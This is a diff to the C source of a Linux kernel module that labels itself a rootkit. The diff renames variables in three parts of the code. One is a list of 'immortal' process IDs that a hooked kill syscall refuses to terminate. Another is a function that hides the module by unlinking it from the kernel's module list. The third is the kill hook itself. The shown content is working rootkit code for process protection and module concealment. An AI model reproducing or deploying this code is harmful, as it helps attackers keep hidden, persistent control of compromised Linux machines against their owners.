@@ -597,12 +597,12 @@ static void process_unhide(int pid) {
 //======================================================================================================================
 
 //********************************************** Make processes immortal ***********************************************
-static int immortalPids[MAX_IMMORTAL_PIDS];
-static size_t numImmortalPids = 0;
+static int immortal_pids[MAX_IMMORTAL_PIDS];
+static size_t num_immortal_pids = 0;
 
-static int isImmortal(int pid) {
-    for (int i = 0; i < numImmortalPids; i++) {
-        if (immortalPids[i] == pid) {
+static int is_immortal(int pid) {
+    for (int i = 0; i < num_immortal_pids; i++) {
+        if (immortal_pids[i] == pid) {
             return 1;
         }
     }
@@ -610,20 +610,20 @@ static int isImmortal(int pid) {
 }
 
 static void make_immortal(int pid) {
-    if (isImmortal(pid)) return;
+    if (is_immortal(pid)) return;
 
-    if (numImmortalPids < MAX_IMMORTAL_PIDS) {
-        immortalPids[numImmortalPids++] = pid;
+    if (num_immortal_pids < MAX_IMMORTAL_PIDS) {
+        immortal_pids[num_immortal_pids++] = pid;
     }
 }
 
 static void make_mortal(int pid) {
-    for (int i = 0; i < numImmortalPids; i++) {
-        if (immortalPids[i] == pid) {
-            for (int j = i; j < numImmortalPids - 1; j++) {
-                immortalPids[j] = immortalPids[j + 1];
+    for (int i = 0; i < num_immortal_pids; i++) {
+        if (immortal_pids[i] == pid) {
+            for (int j = i; j < num_immortal_pids - 1; j++) {
+                immortal_pids[j] = immortal_pids[j + 1];
             }
-            numImmortalPids--;
+            num_immortal_pids--;
             break;
         }
     }
@@ -632,24 +632,24 @@ static void make_mortal(int pid) {
 
 //********************************************* Hide module from the kernel ********************************************
 struct list_head *prev_module = NULL;
-static int isHidden = 0;
+static int is_hidden = 0;
 
 static void hide_module(void) {
-    if (isHidden) return;
+    if (is_hidden) return;
 
     printk(KERN_INFO "rootkit: hiding module\n");
     prev_module = THIS_MODULE->list.prev;
 
     list_del(&THIS_MODULE->list);
-    isHidden = 1;
+    is_hidden = 1;
 }
 
 static void unhide_module(void) {
-    if (!isHidden) return;
+    if (!is_hidden) return;
 
     list_add(&THIS_MODULE->list, prev_module);
     prev_module = NULL;
-    isHidden = 0;
+    is_hidden = 0;
 }
 //======================================================================================================================
 
@@ -660,7 +660,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
     int pid = regs->di;
     int sig = regs->si;
 
-    if (sig < SIGTOGF && isImmortal(pid)) {
+    if (sig < SIGTOGF && is_immortal(pid)) {
         printk(KERN_INFO "rootkit: immortal process: pid = %d cannot be killed\n", pid);
         return 0;
     }
